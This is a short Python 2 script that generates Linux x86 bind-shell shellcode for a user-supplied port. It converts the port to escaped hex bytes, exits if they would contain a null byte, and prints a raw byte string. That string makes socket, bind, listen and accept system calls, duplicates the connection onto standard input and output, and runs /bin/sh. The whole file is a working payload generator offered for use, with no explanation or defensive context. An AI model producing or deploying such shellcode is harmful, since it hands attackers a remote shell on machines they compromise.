import sys

def portconversion(port):
	port = hex(port)[2:]
	sizep = len(port)
	if sizep == 1 or sizep == 3:
		port = "0" + port #Padding 0

	if len(port) == 2:
	        port = '\\x'+str(port[0:2])
	else:
        	port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4])

	if "\\x00" in port:
		print "[!] With this port the shellcode would have a null byte!"
		print "\tPort bytes:", port
		sys.exit()

	return port

def main():
	argnum = len(sys.argv)
	if argnum != 2:
		print "Usage: ./"+sys.argv[0]+" <PORT>"
	else:
		port = int(sys.argv[1])
		if port < 1 or port > 65535:
			print "Invalid Port!  [ 1-65535 ]"
			exit()
		port = portconversion(port)

		shellcode = "\""
		shellcode += "\\x6a\\x66\\x58\\x31\\xdb\\x43\\x31\\xf6\\x56\\x53\\x6a\\x02"
		shellcode += "\\x89\\xe1\\xcd\\x80\\x97\\x31\\xc0\\xb0\\x66\\x56\\x66\\x68"
		shellcode += port
		shellcode += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd"
		shellcode += "\\x80\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x04\\x56\\x57\\x89"
		shellcode += "\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x56\\x56\\x57\\x89\\xe1\\xcd"
		shellcode += "\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79"
		shellcode += "\\xf9\\xb0\\x0b\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"
		shellcode += "\\x69\\x6e\\x89\\xe3\\x56\\x53\\x89\\xe1\\x89\\xf2\\xcd\\x80"
		shellcode += "\""

		print shellcode

if __name__ == "__main__":
    main()
